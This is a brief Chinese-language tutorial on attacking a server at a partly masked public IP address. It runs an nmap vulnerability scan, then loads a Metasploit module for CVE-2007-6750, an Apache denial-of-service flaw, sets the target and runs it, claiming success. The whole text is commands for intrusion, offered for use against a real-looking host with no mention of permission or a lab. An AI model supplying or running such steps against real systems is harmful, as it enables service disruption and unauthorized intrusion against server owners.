用nmap扫描IP地址为8.142.***.***服务器的漏洞

nmap --script vuln 8.142.***.***

漏洞已经扫描出来了,出现"vulnerable"说明有漏洞

接下来我们使用这个漏洞进行入侵

在metasploit中用use命令使用这漏洞

use CVE-2007-6750

现在已经成功使用漏洞了

接下来看此模块需要设置那些参数

show options

 我们只需设置目标ip就可以了

然后使用run命令执行此模块

set rhost 8.142.***.***

敲完此命令后在敲个run命令

run

 效果如下

 这说明我们已经成功了
